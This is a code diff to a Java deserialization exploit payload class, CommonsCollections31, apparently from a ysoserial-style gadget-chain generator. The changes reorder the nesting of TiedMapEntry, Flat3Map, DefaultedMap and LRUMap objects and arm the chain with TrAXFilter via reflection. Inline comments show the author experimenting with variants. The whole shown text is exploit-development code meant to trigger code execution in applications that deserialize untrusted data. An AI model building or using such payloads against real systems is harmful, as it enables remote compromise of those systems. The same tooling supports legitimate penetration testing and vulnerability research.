@@ -69,14 +69,16 @@ public class CommonsCollections31 extends PayloadRunner
         flat3Map1.put(tiedMapEntry1, tiedMapEntry1);
 
         Hashtable hashtable2 = new Hashtable();
-        hashtable2.put("zZ", 1);
+        hashtable2.put("zZ", 1); // it should have a level less, so no Flat3Map or not TiedMap, in this way it could be
+        // possible to reach Hashtable in the TiedMapEntry.equals. Or maybe we should put DefaultedMap at the bottom
+        // instead of Hashtable (let's try this one)
         TiedMapEntry tiedMapEntry2 = new TiedMapEntry(hashtable2, hashtable2);
         Flat3Map flat3Map2 = new Flat3Map();
         flat3Map2.put(tiedMapEntry2, tiedMapEntry2);
-        DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map,Transformer>defaultedMap((Map) tiedMapEntry2, (Transformer<Integer,String>)chain);
+        DefaultedMap<String,Integer> defaultedMap = (DefaultedMap) DefaultedMap.<Map,Transformer>defaultedMap(flat3Map2, (Transformer<Integer,String>)chain);
 
         lruMap.put(defaultedMap, "a");
-        lruMap.put(hashtable1, "b");
+        lruMap.put(flat3Map1, "b");
 
         // swap in values to arm
         Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
@@ -89,6 +91,6 @@ public class CommonsCollections31 extends PayloadRunner
     }
 
     public static void main(final String[] args) throws Exception {
-        PayloadRunner.run(CommonsCollections10.class, args);
+        PayloadRunner.run(CommonsCollections31.class, args);
     }
 }
